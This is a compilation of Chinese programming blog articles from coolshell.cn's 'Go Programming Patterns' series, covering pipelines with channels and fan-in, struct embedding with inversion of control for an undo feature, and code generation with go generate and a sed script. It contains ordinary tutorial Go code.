是不是比之前的那个简单？注意，这个`DecoratedVisitor` 同样可以成为一个Visitor来使用。

好，上面的这些代码全部存在于 `kubectl` 的代码中，你看懂了这里面的代码逻辑，相信你也能够看懂 `kubectl` 的代码了。

（全文完）

# GO编程模式：PIPELINE

#####  [2020年12月26日 ](https://coolshell.cn/articles/21228.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [14 条评论](https://coolshell.cn/articles/21228.html#comments) 49,769 人阅读

![img](photo/go.line_.-1024x191.png)

本篇文章，我们着重介绍Go编程中的Pipeline模式。对于Pipeline用过Unix/Linux命令行的人都不会陌生，他是一种把各种命令拼接起来完成一个更强功能的技术方法。在今天，流式处理，函数式编程，以及应用网关对微服务进行简单的API编排，其实都是受pipeline这种技术方式的影响，Pipeline这种技术在可以很容易的把代码按单一职责的原则拆分成多个高内聚低耦合的小模块，然后可以很方便地拼装起来去完成比较复杂的功能。

### 本文是全系列中第8 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- Go编程模式：Pipeline
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/17929.html)[下一篇文章](https://coolshell.cn/articles/21263.html) »

目录



[HTTP 处理](https://coolshell.cn/articles/21228.html#HTTP_处理)[Channel 管理](https://coolshell.cn/articles/21228.html#Channel_管理)[Channel转发函数](https://coolshell.cn/articles/21228.html#Channel转发函数)[平方函数](https://coolshell.cn/articles/21228.html#平方函数)[过滤奇数函数](https://coolshell.cn/articles/21228.html#过滤奇数函数)[求和函数](https://coolshell.cn/articles/21228.html#求和函数)[Fan in/Out](https://coolshell.cn/articles/21228.html#Fan_inOut)[延伸阅读](https://coolshell.cn/articles/21228.html#延伸阅读)

#### HTTP 处理

这种Pipeline的模式，我们在《[Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)》中有过一个示例，我们在这里再重温一下。在那篇文章中，我们有一堆如 `WithServerHead()` 、`WithBasicAuth()` 、`WithDebugLog()`这样的小功能代码，在我们需要实现某个HTTP API 的时候，我们就可以很容易的组织起来。

原来的代码是下面这个样子：



```
http.HandleFunc("/v1/hello", WithServerHeader(WithAuthCookie(hello)))
http.HandleFunc("/v2/hello", WithServerHeader(WithBasicAuth(hello)))
http.HandleFunc("/v3/hello", WithServerHeader(WithBasicAuth(WithDebugLog(hello))))
```

通过一个代理函数：

```
type HttpHandlerDecorator func(http.HandlerFunc) http.HandlerFunc
func Handler(h http.HandlerFunc, decors ...HttpHandlerDecorator) http.HandlerFunc {
    for i := range decors {
        d := decors[len(decors)-1-i] // iterate in reverse
        h = d(h)
    }
    return h
}
```

我们就可以移除不断的嵌套像下面这样使用了：

```
http.HandleFunc("/v4/hello", Handler(hello,
                WithServerHeader, WithBasicAuth, WithDebugLog))
```

#### Channel 管理

当然，如果你要写出一个[泛型的pipeline框架](https://coolshell.cn/articles/17929.html#泛型的修饰器)并不容易，而使用[Go Generation](https://coolshell.cn/articles/21179.html)，但是，我们别忘了Go语言最具特色的 Go Routine 和 Channel 这两个神器完全也可以被我们用来构造这种编程。

Rob Pike在 [Go Concurrency Patterns: Pipelines and cancellation](https://blog.golang.org/pipelines) 这篇blog中介绍了如下的一种编程模式。

##### Channel转发函数

首先，我们需一个 `echo()`函数，其会把一个整型数组放到一个Channel中，并返回这个Channel

```
func echo(nums []int) <-chan int {
  out := make(chan int)
  go func() {
    for _, n := range nums {
      out <- n
    }
    close(out)
  }()
  return out
}
```

然后，我们依照这个模式，我们可以写下这个函数。

##### 平方函数

```
func sq(in <-chan int) <-chan int {
  out := make(chan int)
  go func() {
    for n := range in {
      out <- n * n
    }
    close(out)
  }()
  return out
}
```

##### 过滤奇数函数

```
func odd(in <-chan int) <-chan int {
  out := make(chan int)
  go func() {
    for n := range in {
      if n%2 != 0 {
        out <- n
      }
    }
    close(out)
  }()
  return out
}
```

##### 求和函数

```
func sum(in <-chan int) <-chan int {
  out := make(chan int)
  go func() {
    var sum = 0
    for n := range in {
      sum += n
    }
    out <- sum
    close(out)
  }()
  return out
}
```

然后，我们的用户端的代码如下所示：（注：**你可能会觉得，`sum()`，`odd()` 和 `sq()`太过于相似。你其实可以通过我们之前的[Map/Reduce编程模式](https://coolshell.cn/articles/21164.html)或是[Go Generation的方式](https://coolshell.cn/articles/21179.html)来合并一下**）

```
var nums = []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
for n := range sum(sq(odd(echo(nums)))) {
  fmt.Println(n)
}
```

上面的代码类似于我们执行了Unix/Linux命令： `echo $nums | sq | sum`

同样，如果你不想有那么多的函数嵌套，你可以使用一个代理函数来完成。

```
type EchoFunc func ([]int) (<- chan int) 
type PipeFunc func (<- chan int) (<- chan int) 

func pipeline(nums []int, echo EchoFunc, pipeFns ... PipeFunc) <- chan int {
  ch  := echo(nums)
  for i := range pipeFns {
    ch = pipeFns[i](ch)
  }
  return ch
}
```

然后，就可以这样做了：

```
var nums = []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}    
for n := range pipeline(nums, gen, odd, sq, sum) {
    fmt.Println(n)
  }
```

#### Fan in/Out

动用Go语言的 Go Routine和 Channel还有一个好处，就是可以写出1对多，或多对1的pipeline，也就是Fan In/ Fan Out。下面，我们来看一个Fan in的示例：

我们想通过并发的方式来对一个很长的数组中的质数进行求和运算，我们想先把数组分段求和，然后再把其集中起来。

下面是我们的主函数：

```
func makeRange(min, max int) []int {
  a := make([]int, max-min+1)
  for i := range a {
    a[i] = min + i
  }
  return a
}

func main() {
  nums := makeRange(1, 10000)
  in := echo(nums)

  const nProcess = 5
  var chans [nProcess]<-chan int
  for i := range chans {
    chans[i] = sum(prime(in))
  }

  for n := range sum(merge(chans[:])) {
    fmt.Println(n)
  }
}
```

再看我们的 `prime()` 函数的实现 ：

```
func is_prime(value int) bool {
  for i := 2; i <= int(math.Floor(float64(value) / 2)); i++ {
    if value%i == 0 {
      return false
    }
  }
  return value > 1
}

func prime(in <-chan int) <-chan int {
  out := make(chan int)
  go func ()  {
    for n := range in {
      if is_prime(n) {
        out <- n
      }
    }
    close(out)
  }()
  return out
}
```

我们可以看到，

- 我们先制造了从1到10000的一个数组，
- 然后，把这堆数组全部 `echo`到一个channel里 – `in`
- 此时，生成 5 个 Channel，然后都调用 `sum(prime(in))` ，于是每个Sum的Go Routine都会开始计算和
- 最后再把所有的结果再求和拼起来，得到最终的结果。

其中的merge代码如下：

```
func merge(cs []<-chan int) <-chan int {
  var wg sync.WaitGroup
  out := make(chan int)

  wg.Add(len(cs))
  for _, c := range cs {
    go func(c <-chan int) {
      for n := range c {
        out <- n
      }
      wg.Done()
    }(c)
  }
  go func() {
    wg.Wait()
    close(out)
  }()
  return out
}
```

用图片表示一下，整个程序的结构如下所示：

![img](photo/pipeline-1024x425.png)

#### 延伸阅读

如果你还想了解更多的这样的与并发相关的技术，可以参看下面这些资源：

- **Go** **Concurrency** **Patterns** – **Rob** **Pike –** 2012 Google I/O **
  **presents the basics of Go‘s concurrency primitives and several ways to apply them.
  https://www.youtube.com/watch?v=f6kdp27TYZs
- **Advanced Go Concurrency Patterns** – **Rob** **Pike** – 2013 Google I/O **
  **covers more complex uses of Go’s primitives, especially select.
  https://blog.golang.org/advanced-go-concurrency-patterns
- **Squinting at Power Series** – **Douglas McIlroy**‘s paper **
  **shows how Go-like concurrency provides elegant support for complex calculations.
  https://swtch.com/~rsc/thread/squint.pdf

（全文完）

# GO编程模式：委托和反转控制

#####  [2020年12月26日 ](https://coolshell.cn/articles/21214.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [15 条评论](https://coolshell.cn/articles/21214.html#comments) 44,653 人阅读



![img](photo/go.pair_-300x298.png)图片来源：[GopherSource](https://gophersource.com/)



反转控制[IoC – Inversion of Control](https://en.wikipedia.org/wiki/Inversion_of_control) 是一种软件设计的方法，其主要的思想是把控制逻辑与业务逻辑分享，不要在业务逻辑里写控制逻辑，这样会让控制逻辑依赖于业务逻辑，而是反过来，让业务逻辑依赖控制逻辑。在《[IoC/DIP其实是一种管理思想](https://coolshell.cn/articles/9949.html)》中的那个开关和电灯的示例一样，开关是控制逻辑，电器是业务逻辑，不要在电器中实现开关，而是把开关抽象成一种协议，让电器都依赖之。这样的编程方式可以有效的降低程序复杂度，并提升代码重用。

### 本文是全系列中第4 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- Go编程模式：委托和反转控制
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21146.html)[下一篇文章](https://coolshell.cn/articles/21164.html) »

面向对象的设计模式这里不提了，我们来看看Go语言使用Embed结构的一个示例。



目录



[嵌入和委托](https://coolshell.cn/articles/21214.html#嵌入和委托)[结构体嵌入](https://coolshell.cn/articles/21214.html#结构体嵌入)[方法重写](https://coolshell.cn/articles/21214.html#方法重写)[嵌入结构多态](https://coolshell.cn/articles/21214.html#嵌入结构多态)[反转控制](https://coolshell.cn/articles/21214.html#反转控制)[实现Undo功能](https://coolshell.cn/articles/21214.html#实现Undo功能)[反转依赖](https://coolshell.cn/articles/21214.html#反转依赖)

#### 嵌入和委托

##### 结构体嵌入

在Go语言中，我们可以很方便的把一个结构体给嵌到另一个结构体中。如下所示：

**type** Widget **struct** {

​    X, Y **int**

}

**type** Label **struct** {

​    Widget        // Embedding (delegation)

​    Text   **string** // Aggregation

}

上面的示例中，我们把 `Widget`嵌入到了 `Label` 中，于是，我们可以这样使用：

label := Label{Widget{10, 10}, "State:"}

label.X = 11

label.Y = 12

如果在 `Label` 结构体里出现了重名，就需要解决重名，例如，如果 成员 `X` 重名，用 `label.X`表明 是自己的`X` ，用 `label.Wedget.X` 表示嵌入过来的。

有了这样的嵌入，就可以像UI组件一样的在结构构的设计上进行层层分解。比如，我可以新出来两个结构体 `Button` 和 `ListBox`：

**type** Button **struct** {

​    Label // Embedding (delegation)

}

**type** ListBox **struct** {

​    Widget          // Embedding (delegation)

​    Texts  []**string** // Aggregation

​    Index  **int**      // Aggregation

}

##### 方法重写

然后，我们需要两个接口 `Painter` 用于把组件画出来，`Clicker` 用于表明点击事件：

**type** Painter **interface** {

​    Paint()

}

 

**type** Clicker **interface** {

​    Click()

}

当然，

- 对于 `Lable` 来说，只有 `Painter` ，没有`Clicker`
- 对于 `Button` 和 `ListBox`来说，`Painter` 和`Clicker`都有。

下面是一些实现：

**func** (label Label) Paint() {

  fmt.Printf("%p:Label.Paint(%q)\n", &label, label.Text)

}

//因为这个接口可以通过 Label 的嵌入带到新的结构体，

//所以，可以在 Button 中可以重载这个接口方法以

**func** (button Button) Paint() { // Override

​    fmt.Printf("Button.Paint(%s)\n", button.Text)

}

**func** (button Button) Click() {

​    fmt.Printf("Button.Click(%s)\n", button.Text)

}

**func** (listBox ListBox) Paint() {

​    fmt.Printf("ListBox.Paint(%q)\n", listBox.Texts)

}

**func** (listBox ListBox) Click() {

​    fmt.Printf("ListBox.Click(%q)\n", listBox.Texts)

}

这里，需要重点提示一下，**`Button.Paint()` 接口可以通过 Label 的嵌入带到新的结构体，如果 `Button.Paint()` 不实现的话，会调用 `Label.Paint()` ，所以，在 `Button` 中声明 `Paint()` 方法，相当于Override**。

##### 嵌入结构多态

通过下面的程序可以看到，整个多态是怎么执行的。

button1 := Button{Label{Widget{10, 70}, "OK"}}

button2 := NewButton(50, 70, "Cancel")

listBox := ListBox{Widget{10, 40}, 

​    []**string**{"AL", "AK", "AZ", "AR"}, 0}

**for** _, painter := **range** []Painter{label, listBox, button1, button2} {

​    painter.Paint()

}

 

**for** _, widget := **range** []**interface**{}{label, listBox, button1, button2} {

  widget.(Painter).Paint()

  **if** clicker, ok := widget.(Clicker); ok {

​    clicker.Click()

  }

  fmt.Println() // print a empty line 

}

我们可以看到，我们可以使用接口来多态，也可以使用 泛型的 `interface{}` 来多态，但是需要有一个类型转换。

#### 反转控制

我们再来看一个示例，我们有一个存放整数的数据结构，如下所示：

**type** IntSet **struct** {

​    data **map**[**int**]**bool**

}

**func** NewIntSet() IntSet {

​    **return** IntSet{make(**map**[**int**]**bool**)}

}

**func** (set *IntSet) Add(x **int**) {

​    set.data[x] = **true**

}

**func** (set *IntSet) Delete(x **int**) {

​    delete(set.data, x)

}

**func** (set *IntSet) Contains(x **int**) **bool** {

​    **return** set.data[x]

}

其中实现了 `Add()` 、`Delete()` 和 `Contains()` 三个操作，前两个是写操作，后一个是读操作。

##### 实现Undo功能

现在我们想实现一个 Undo 的功能。我们可以把把 `IntSet` 再包装一下变成 `UndoableIntSet` 代码如下所示：

**type** UndoableIntSet **struct** { // Poor style

​    IntSet    // Embedding (delegation)

​    functions []**func**()

}

 

**func** NewUndoableIntSet() UndoableIntSet {

​    **return** UndoableIntSet{NewIntSet(), **nil**}

}

 

**func** (set *UndoableIntSet) Add(x **int**) { // Override

​    **if** !set.Contains(x) {

​        set.data[x] = **true**

​        set.functions = append(set.functions, **func**() { set.Delete(x) })

​    } **else** {

​        set.functions = append(set.functions, **nil**)

​    }

}

**func** (set *UndoableIntSet) Delete(x **int**) { // Override

​    **if** set.Contains(x) {

​        delete(set.data, x)

​        set.functions = append(set.functions, **func**() { set.Add(x) })

​    } **else** {

​        set.functions = append(set.functions, **nil**)

​    }

}

**func** (set *UndoableIntSet) Undo() error {

​    **if** len(set.functions) == 0 {

​        **return** errors.New("No functions to undo")

​    }

​    index := len(set.functions) - 1

​    **if** function := set.functions[index]; function != **nil** {

​        function()

​        set.functions[index] = **nil** // For garbage collection

​    }

​    set.functions = set.functions[:index]

​    **return** **nil**

}

在上面的代码中，我们可以看到

- 我们在 `UndoableIntSet` 中嵌入了`IntSet` ，然后Override了 它的 `Add()`和 `Delete()` 方法。
- `Contains()` 方法没有Override，所以，会被带到 `UndoableInSet` 中来了。
- 在Override的 `Add()`中，记录 `Delete` 操作
- 在Override的 `Delete()` 中，记录 `Add` 操作
- 在新加入 `Undo()` 中进行Undo操作。

通过这样的方式来为已有的代码扩展新的功能是一个很好的选择，这样，可以在重用原有代码功能和重新新的功能中达到一个平衡。但是，这种方式最大的问题是，Undo操作其实是一种控制逻辑，并不是业务逻辑，所以，在复用 Undo这个功能上是有问题。因为其中加入了大量跟 `IntSet` 相关的业务逻辑。

##### 反转依赖

现在我们来看另一种方法：

我们先声明一种函数接口，表现我们的Undo控制可以接受的函数签名是什么样的：

**type** Undo []**func**()

有了上面这个协议后，我们的Undo控制逻辑就可以写成如下：

**func** (undo *Undo) Add(function **func**()) {

  *undo = append(*undo, function)

}

**func** (undo *Undo) Undo() error {

  functions := *undo

  **if** len(functions) == 0 {

​    **return** errors.New("No functions to undo")

  }

  index := len(functions) - 1

  **if** function := functions[index]; function != **nil** {

​    function()

​    functions[index] = **nil** // For garbage collection

  }

  *undo = functions[:index]

  **return** **nil**

}

这里你不必觉得奇怪， `Undo` 本来就是一个类型，不必是一个结构体，是一个函数数组也没什么问题。

然后，我们在我们的IntSet里嵌入 Undo，然后，再在 `Add()` 和 `Delete()` 里使用上面的方法，就可以完成功能。

**type** IntSet **struct** {

​    data **map**[**int**]**bool**

​    undo Undo

}

 

**func** NewIntSet() IntSet {

​    **return** IntSet{data: make(**map**[**int**]**bool**)}

}

**func** (set *IntSet) Undo() error {

​    **return** set.undo.Undo()

}

 

**func** (set *IntSet) Contains(x **int**) **bool** {

​    **return** set.data[x]

}

**func** (set *IntSet) Add(x **int**) {

​    **if** !set.Contains(x) {

​        set.data[x] = **true**

​        set.undo.Add(**func**() { set.Delete(x) })

​    } **else** {

​        set.undo.Add(**nil**)

​    }

}

 

**func** (set *IntSet) Delete(x **int**) {

​    **if** set.Contains(x) {

​        delete(set.data, x)

​        set.undo.Add(**func**() { set.Add(x) })

​    } **else** {

​        set.undo.Add(**nil**)

​    }

}

这个就是控制反转，不再由 控制逻辑 `Undo` 来依赖业务逻辑 `IntSet`，而是由业务逻辑 `IntSet` 来依赖 `Undo` 。其依赖的是其实是一个协议，这个协议是一个没有参数的函数数组。我们也可以看到，我们 Undo 的代码就可以复用了。

（全文完）

# GO 编程模式：GO GENERATION

#####  [2020年12月25日 ](https://coolshell.cn/articles/21179.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [18 条评论](https://coolshell.cn/articles/21179.html#comments) 40,656 人阅读



![img](photo/go.generate-296x300.png)图片来源：[GopherSource](https://gophersource.com/)



在本篇文章中，我们将要学习一下Go语言的代码生成的玩法。Go语言代码生成主要还是用来解决编程泛型的问题，泛型编程主要解决的问题是因为静态类型语言有类型，所以，相关的算法或是对数据处理的程序会因为类型不同而需要复制一份，这样导致数据类型和算法功能耦合的问题。泛型编程可以解决这样的问题，就是说，在写代码的时候，不用关心处理数据的类型，只需要关心相当处理逻辑。泛型编程是静态语言中非常非常重要的特征，如果没有泛型，我们很难做到多态，也很难完成抽象，会导致我们的代码冗余量很大。

### 本文是全系列中第6 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- [Go编程模式：切片，接口，时间和性能](https://coolshell.cn/articles/21128.html)
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- Go 编程模式：Go Generation
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

« [上一篇文章](https://coolshell.cn/articles/21164.html)[下一篇文章](https://coolshell.cn/articles/17929.html) »

目录



[现实中的类比](https://coolshell.cn/articles/21179.html#现实中的类比)[Go语方的类型检查](https://coolshell.cn/articles/21179.html#Go语方的类型检查)[Type Assert](https://coolshell.cn/articles/21179.html#Type_Assert)[Reflection](https://coolshell.cn/articles/21179.html#Reflection)[它山之石](https://coolshell.cn/articles/21179.html#它山之石)[Go Generator](https://coolshell.cn/articles/21179.html#Go_Generator)[函数模板](https://coolshell.cn/articles/21179.html#函数模板)[函数生成脚本](https://coolshell.cn/articles/21179.html#函数生成脚本)[生成代码](https://coolshell.cn/articles/21179.html#生成代码)[新版Filter](https://coolshell.cn/articles/21179.html#新版Filter)[第三方工具](https://coolshell.cn/articles/21179.html#第三方工具)

#### 现实中的类比

举个现实当中的例子，用螺丝刀来做具比方，螺丝刀本来就是一个拧螺丝的动作，但是因为螺丝的类型太多，有平口的，有十字口的，有六角的……螺丝还有大小尺寸，导致我们的螺丝刀为了要适配各种千奇百怪的螺丝类型（样式和尺寸），导致要做出各种各样的螺丝刀。

| ![img](photo/type01-300x225.png) | ![img](photo/type02-300x225.png) |
| -------------------------------- | -------------------------------- |
|                                  |                                  |

而真正的抽象是螺丝刀不应该关心螺丝的类型，只要关注好自己的功能是否完备，并让自己可以适配于不同类型的螺丝，如下所示，这就是所谓的泛型编程要解决的实际问题。



![img](photo/type03-300x226.png)

#### Go语方的类型检查

因为Go语言目前并不支持真正的泛型，所以，只能用 `interface{}` 这样的类似于 `void*` 这种过度泛型来玩这就导致了我们在实际过程中就需要进行类型检查。Go语言的类型检查有两种技术，一种是 Type Assert，一种是Reflection。

##### Type Assert

这种技术，一般是对某个变量进行 `.(type)`的转型操作，其会返回两个值， `variable, error`，第一个返回值是被转换好的类型，第二个是如果不能转换类型，则会报错。

比如下面的示例，我们有一个通用类型的容器，可以进行 `Put(val)`和 `Get()`，注意，其使用了 `interface{}`作泛型

```
//Container is a generic container, accepting anything.
type Container []interface{}

//Put adds an element to the container.
func (c *Container) Put(elem interface{}) {
    *c = append(*c, elem)
}
//Get gets an element from the container.
func (c *Container) Get() interface{} {
    elem := (*c)[0]
    *c = (*c)[1:]
    return elem
}
```

在使用中，我们可以这样使用

```
intContainer := &Container{}
intContainer.Put(7)
intContainer.Put(42)
```

但是，在把数据取出来时，因为类型是 `interface{}` ，所以，你还要做一个转型，如果转型成功能才能进行后续操作（因为 `interface{}`太泛了，泛到什么类型都可以放）下在是一个Type Assert的示例：

```
// assert that the actual type is int
elem, ok := intContainer.Get().(int)
if !ok {
    fmt.Println("Unable to read an int from intContainer")
}

fmt.Printf("assertExample: %d (%T)\n", elem, elem)
```

##### Reflection

对于反射，我们需要把上面的代码修改如下：

```
type Container struct {
    s reflect.Value
}
func NewContainer(t reflect.Type, size int) *Container {
    if size <=0  { size=64 }
    return &Container{
        s: reflect.MakeSlice(reflect.SliceOf(t), 0, size), 
    }
}
func (c *Container) Put(val interface{})  error {
    if reflect.ValueOf(val).Type() != c.s.Type().Elem() {
        return fmt.Errorf(“Put: cannot put a %T into a slice of %s", 
            val, c.s.Type().Elem()))
    }
    c.s = reflect.Append(c.s, reflect.ValueOf(val))
    return nil
}
func (c *Container) Get(refval interface{}) error {
    if reflect.ValueOf(refval).Kind() != reflect.Ptr ||
        reflect.ValueOf(refval).Elem().Type() != c.s.Type().Elem() {
        return fmt.Errorf("Get: needs *%s but got %T", c.s.Type().Elem(), refval)
    }
    reflect.ValueOf(refval).Elem().Set( c.s.Index(0) )
    c.s = c.s.Slice(1, c.s.Len())
    return nil
}
```

上面的代码并不难读，这是完全使用 reflection的玩法，其中

- 在 `NewContainer()`会根据参数的类型初始化一个Slice
- 在 `Put()`时候，会检查 `val` 是否和Slice的类型一致。
- 在 `Get()`时，我们需要用一个入参的方式，因为我们没有办法返回 `reflect.Value` 或是 `interface{}`，不然还要做Type Assert
- 但是有类型检查，所以，必然会有检查不对的道理 ，因此，需要返回 `error`

于是在使用上面这段代码的时候，会是下面这个样子：

```
f1 := 3.1415926
f2 := 1.41421356237

c := NewMyContainer(reflect.TypeOf(f1), 16)

if err := c.Put(f1); err != nil {
  panic(err)
}
if err := c.Put(f2); err != nil {
  panic(err)
}

g := 0.0

if err := c.Get(&g); err != nil {
  panic(err)
}
fmt.Printf("%v (%T)\n", g, g) //3.1415926 (float64)
fmt.Println(c.s.Index(0)) //1.4142135623
```

我们可以看到，Type Assert是不用了，但是用反射写出来的代码还是有点复杂的。那么有没有什么好的方法？

#### 它山之石

对于泛型编程最牛的语言 C++ 来说，这类的问题都是使用 Template来解决的。

| `//用<class T>来描述泛型 template <class T>  T GetMax (T a, T b)  {     T result;     result = (a>b)? a : b;     return (result);  }  ` | `int i=5, j=6, k;  //生成int类型的函数 k=GetMax<int>(i,j);  long l=10, m=5, n;  //生成long类型的函数 n=GetMax<long>(l,m);  ` |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
|                                                              |                                                              |

C++的编译器会在编译时分析代码，根据不同的变量类型来自动化的生成相关类型的函数或类。C++叫模板的具体化。

这个技术是编译时的问题，所以，不需要我们在运行时进行任何的运行的类型识别，我们的程序也会变得比较的干净。

那么，我们是否可以在Go中使用C++的这种技术呢？答案是肯定的，只是Go的编译器不帮你干，你需要自己动手。

#### Go Generator

要玩 Go的代码生成，你需要三件事：

1. 一个函数模板，其中设置好相应的占位符。
2. 一个脚本，用于按规则来替换文本并生成新的代码。
3. 一行注释代码。

##### 函数模板

我们把我们之前的示例改成模板。取名为 `container.tmp.go` 放在 `./template/`下

```
package PACKAGE_NAME
type GENERIC_NAMEContainer struct {
    s []GENERIC_TYPE
}
func NewGENERIC_NAMEContainer() *GENERIC_NAMEContainer {
    return &GENERIC_NAMEContainer{s: []GENERIC_TYPE{}}
}
func (c *GENERIC_NAMEContainer) Put(val GENERIC_TYPE) {
    c.s = append(c.s, val)
}
func (c *GENERIC_NAMEContainer) Get() GENERIC_TYPE {
    r := c.s[0]
    c.s = c.s[1:]
    return r
}
```

我们可以看到函数模板中我们有如下的占位符：

- `PACKAGE_NAME` – 包名
- `GENERIC_NAME` – 名字
- `GENERIC_TYPE` – 实际的类型

其它的代码都是一样的。

##### 函数生成脚本

然后，我们有一个叫`gen.sh`的生成脚本，如下所示：

```
#!/bin/bash

set -e

SRC_FILE=${1}
PACKAGE=${2}
TYPE=${3}
DES=${4}
#uppcase the first char
PREFIX="$(tr '[:lower:]' '[:upper:]' <<< ${TYPE:0:1})${TYPE:1}"

DES_FILE=$(echo ${TYPE}| tr '[:upper:]' '[:lower:]')_${DES}.go

sed 's/PACKAGE_NAME/'"${PACKAGE}"'/g' ${SRC_FILE} | \
    sed 's/GENERIC_TYPE/'"${TYPE}"'/g' | \
    sed 's/GENERIC_NAME/'"${PREFIX}"'/g' > ${DES_FILE}
```

其需要4个参数：

- 模板源文件
- 包名
- 实际需要具体化的类型
- 用于构造目标文件名的后缀

然后其会用 `sed` 命令去替换我们的上面的函数模板，并生成到目标文件中。（关于sed命令请参看本站的《[sed 简明教程](https://coolshell.cn/articles/9104.html)》）

##### 生成代码

接下来，我们只需要在代码中打一个特殊的注释：

```
//go:generate ./gen.sh ./template/container.tmp.go gen uint32 container
func generateUint32Example() {
    var u uint32 = 42
    c := NewUint32Container()
    c.Put(u)
    v := c.Get()
    fmt.Printf("generateExample: %d (%T)\n", v, v)
}

//go:generate ./gen.sh ./template/container.tmp.go gen string container
func generateStringExample() {
    var s string = "Hello"
    c := NewStringContainer()
    c.Put(s)
    v := c.Get()
    fmt.Printf("generateExample: %s (%T)\n", v, v)
}
```

其中，

- 第一个注释是生成包名为 `gen` 类型为 `uint32` 目标文件名以 `container` 为后缀
- 第二个注释是生成包名为 `gen` 类型为 `string` 目标文件名以 `container` 为后缀

然后，在工程目录中直接执行 `go generate` 命令，就会生成如下两份代码，

一份文件名为`uint32_container.go`

```
package gen

type Uint32Container struct {
    s []uint32
}
func NewUint32Container() *Uint32Container {
    return &Uint32Container{s: []uint32{}}
}
func (c *Uint32Container) Put(val uint32) {
    c.s = append(c.s, val)
}
func (c *Uint32Container) Get() uint32 {
    r := c.s[0]
    c.s = c.s[1:]
    return r
}
```

另一份的文件名为 `string_container.go`

```
package gen

type StringContainer struct {
    s []string
}
func NewStringContainer() *StringContainer {
    return &StringContainer{s: []string{}}
}
func (c *StringContainer) Put(val string) {
    c.s = append(c.s, val)
}
func (c *StringContainer) Get() string {
    r := c.s[0]
    c.s = c.s[1:]
    return r
}
```

这两份代码可以让我们的代码完全编译通过，所付出的代价就是需要多执行一步 `go generate` 命令。

#### 新版Filter

现在我们再回头看看我们之前《[Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)》中的那些个用反射整出来的例子，有了这样的技术，我就不必在代码里用那些晦涩难懂的反射来做运行时的类型检查了。我们可以写下很干净的代码，让编译器在编译时检查类型对不对。下面是一个Fitler的模板文件 `filter.tmp.go`：

```
package PACKAGE_NAME

type GENERIC_NAMEList []GENERIC_TYPE

type GENERIC_NAMEToBool func(*GENERIC_TYPE) bool

func (al GENERIC_NAMEList) Filter(f GENERIC_NAMEToBool) GENERIC_NAMEList {
    var ret GENERIC_NAMEList
    for _, a := range al {
        if f(&a) {
            ret = append(ret, a)
        }
    }
    return ret
}
```

于是我们可在需要使用这个的地方，加上相关的 go generate 的注释

```
type Employee struct {
  Name     string
  Age      int
  Vacation int
  Salary   int
}

//go:generate ./gen.sh ./template/filter.tmp.go gen Employee filter
func filterEmployeeExample() {

  var list = EmployeeList{
    {"Hao", 44, 0, 8000},
    {"Bob", 34, 10, 5000},
    {"Alice", 23, 5, 9000},
    {"Jack", 26, 0, 4000},
    {"Tom", 48, 9, 7500},
  }

  var filter EmployeeList
  filter = list.Filter(func(e *Employee) bool {
    return e.Age > 40
  })

  fmt.Println("----- Employee.Age > 40 ------")
  for _, e := range filter {
    fmt.Println(e)
  }

  filter = list.Filter(func(e *Employee) bool {
    return e.Salary <= 5000
  })

  fmt.Println("----- Employee.Salary <= 5000 ------")
  for _, e := range filter {
    fmt.Println(e)
  }
}
```

#### 第三方工具

我们并不需要自己手写 `gen.sh` 这样的工具类，已经有很多第三方的已经写好的可以使用。下面是一个列表：

- Genny – https://github.com/cheekybits/genny
- Generic – https://github.com/taylorchu/generic
- GenGen – https://github.com/joeshaw/gengen
- Gen – https://github.com/clipperhouse/gen

（全文完）

# GO编程模式：MAP-REDUCE

#####  [2020年12月24日 ](https://coolshell.cn/articles/21164.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [19 条评论](https://coolshell.cn/articles/21164.html#comments) 44,610 人阅读

